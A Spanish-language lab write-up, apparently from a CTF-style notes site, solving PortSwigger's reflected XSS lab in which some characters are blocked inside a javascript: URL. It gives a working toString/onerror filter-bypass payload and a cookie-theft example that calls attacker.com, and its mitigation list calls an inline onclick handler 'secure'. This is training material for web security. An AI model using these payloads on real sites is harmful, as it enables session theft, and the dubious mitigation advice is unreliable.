---
title: "Reflected XSS in a JavaScript URL with some characters blocked"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "reflected-xss-in-a-javascript-url-with-some-characters-blocked"
author: "Z4k7"
date: "2026-04-14"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected_XSS"
  - "Character_Filtering"
  - "WAF_Bypass"
  - "JavaScript_Tricks"
  - "x27"
techniques:
  - "Reflected XSS"
  - "Character Filtering Bypass"
  - "toString Override"
  - "Error Handling"
  - "JavaScript Tricks"
tools:
  - "Burp Suite"
  - "Burp Repeater"
  - "Browser DevTools"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab BurpSuite Academy — Reflected XSS en URL de JavaScript donde ciertos caracteres están bloqueados por WAF. Técnica: explotar JavaScript engine usando toString override, function arrows, error handlers y operadores coma para construir payload válido sin caracteres prohibidos. Payload ejecuta alert(1337) escapando completamente el filtro. Demuestra que filtros de caracteres individuales son insuficientes contra técnicas avanzadas de JavaScript.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Ejecutar `alert(1337)` en laboratorio que bloquea ciertos caracteres, bypasseando protección WAF mediante técnicas avanzadas de JavaScript.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos a la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425010313425.jpg"
        caption: "Acceso inicial al lab"
      - kind: "note"
        text: |
          Exploramos la aplicación buscando puntos de entrada para XSS:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425010455629.jpg"
        caption: "Búsqueda de campos vulnerables"
      - kind: "note"
        text: |
          Identificamos que el formulario envía datos vía POST y genera un link con la URL. El parámetro se refleja en la URL de JavaScript.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425010959589.jpg"
        caption: "Análisis del formulario y generación de URL"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En Reflected XSS, el punto crítico es dónde se renderiza tu entrada. Aquí, se renderiza dentro de una URL de JavaScript (`javascript:fetch(...)`). Esto significa que puedes manipular el JavaScript que se ejecuta al hacer click en el link."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Paso 1: Identificar qué está bloqueado
          Intentamos inyectar payloads simples para entender las restricciones:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425011105145.jpg"
        caption: "Intento inicial - bloqueado"
      - kind: "note"
        text: |
          El servidor bloquea ciertos caracteres. Necesitamos identificar cuáles funcionan.
          Paso 2: Analizar la estructura de la URL
          El servidor genera:
      - kind: "code"
        lang: "HTML"
        code: |
          <a href="
          javascript:fetch('/analytics',
          {
              method:'post',
              body:'/post%3fpostId%3d5'
          }).finally(
          _ => window.location = '/')
          ">Back to Blog</a>
      - kind: "note"
        text: |
          Nuestra entrada se refleja en el `body` del fetch. Si manipulamos esto correctamente, podemos inyectar JavaScript adicional.
      - kind: "callout"
        type: "warning"
        label: "Estructura de ataque"
        text: "La clave es escapar del contexto actual (el body del fetch) e inyectar código nuevo. Pero ciertos caracteres necesarios para esto están bloqueados. Necesitamos técnicas creativas."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Paso 1: Entender el contexto
          El payload actual se vería así:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          fetch('/analytics', {
              method:'post',
              body:'/post?postId=5&[NUESTRO_INPUT]'  // Aquí se refleja
          }).finally(
          _ => window.location = '/')
      - kind: "note"
        text: |
          Necesitamos salir de la cadena del `body` e inyectar JavaScript nuevo.
          Paso 2: Construir payload con toString trick
          Cuando ciertos caracteres están bloqueados, usamos técnicas avanzadas:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          '},
          x=x=>{
              throw/**/onerror=alert,
              1337
          },
          toString=x,
          window+'',
          {x:'
      - kind: "note"
        text: |
          Desglose:
          1. `'},` — Cierra la cadena del body y el objeto del fetch
          2. `x=x=>{}` — Define una función flecha que será nuestro handler
          3. `throw//onerror=alert` — Lanza un error y asigna `alert` como manejador de error. El `//` es un comentario vacío para romper patrones.
          4. `,1337` — El operador coma devuelve `1337` como valor final
          5. `},toString=x,` — Cierra la función y sobrescribe `toString`
          6. `window+''` — Forza conversión de `window` a string, invocando `toString()` → ejecuta nuestra función
          7. `{x:'` — Abre un nuevo objeto (para mantener sintaxis válida)
          Paso 3: Inyectar en Burp Repeater
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425083824569.jpg"
        caption: "Inyección en Repeater"
      - kind: "note"
        text: |
          Enviamos:
      - kind: "code"
        lang: "BASH"
        code: |
          '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
      - kind: "note"
        text: |
          Paso 4: Validar ejecución
          El payload final se vería:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          fetch('/analytics', {
              method: 'post',
              body: '/post?postId=5&'
          }, x = x => {
              throw /**/
              onerror = alert,
              1337
          }, toString = x, window + '', {
              x: ''
          }).finally(_ => window.location = '/')
      - kind: "note"
        text: |
          Cuando JavaScript interpreta esto:
          1. `x=x=>{}` define la función
          2. `toString=x` sobrescribe toString
          3. `window+''` forza string conversion → invoca toString → ejecuta la función
          4. La función `throw` dispara un error
          5. `onerror=alert` asigna `alert` como handler
          6. El error se maneja con `alert(1337)`
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425085459175.jpg"
        caption: "Confirmación de ejecución"
      - kind: "note"
        text: |
          ✅ Alert ejecutado exitosamente.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20a%20JavaScript%20URL%20with%20some%20characters%20blocked/file-20260425090033661.jpg"
        caption: "Segunda confirmación"

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          En este lab no hay escalada de acceso (es PoC de Reflected XSS). La ejecución de `alert(1337)` demuestra:
      - kind: "bullet"
        text: "✅ JavaScript injection funciona"
      - kind: "bullet"
        text: "✅ WAF bypass fue exitoso"
      - kind: "bullet"
        text: "✅ Payload ejecutó sin caracteres bloqueados"
      - kind: "note"
        text: |
          En un ataque real, el payload sería algo como:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          fetch('http://attacker.com/steal?cookie=' + document.cookie)
      - kind: "note"
        text: |
          En lugar de `alert(1337)`.

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          N/A — Este lab es PoC de injection, no escalada.

lessons:
  - 'Filtros de caracteres individuales son insuficientes. Aunque bloqueen `<`, `>`, `(`, `)`, JavaScript ofrece múltiples formas de ejecutar código.'
  - 'toString override es técnica poderosa. Convertir objetos a string puede disparar código si `toString` fue sobrescrito.'
  - 'Operador coma devuelve último valor. `throw//onerror=alert,1337` — la coma hace que la expresión devuelva `1337`.'
  - 'Comentarios vacíos `//` rompen patrones. Algunos WAF buscan patrones como `onerror=alert`, pero `onerror=alert//` puede evadir.'
  - 'El error handling es vector de ataque. Si `onerror` global no está definido, se puede asignar dinámicamente.'
  - 'Reflected XSS en URLs de JavaScript es crítico. URLs como `javascript:...` que reflejan entrada son altamente peligrosas.'
mitigation:
  - 'HTML encoding de entrada:'
  - 'from html import escape'
  - 'user_input = escape(user_input)  # '' → &#x27; etc'
  - 'Content Security Policy (CSP):'
  - 'Content-Security-Policy: default-src ''self''; script-src ''self'';'
  - 'Bloquearía URLs de JavaScript inline.'
  - 'Evitar URLs de JavaScript:'
  - '❌ Vulnerable'
  - '`<a href="javascript:fetch(...)">Click</a>`'
  - '✅ Seguro'
  - '`<a href="#" onclick="fetch(...)">Click</a>`'
  - 'Input validation whitelist:'
  - '`if not re.match(r''^[a-zA-Z0-9\-_]+$'', user_input):`'
  - '`return error("Invalid characters")`'
  - 'WAF rules más robustas:'
  - '- No bloquear solo caracteres individuales'
  - '- Detectar patrones de ataque (onerror=, toString=, etc.)'
  - '- Análisis de intención, no sintaxis'
  - 'Subresource Integrity (SRI) para scripts externos:'
  - '`<script src="https://cdn.example.com/app.js"`'
  - '`integrity="sha384-abc123..."`'
  - '`crossorigin="anonymous"></script>`'
---
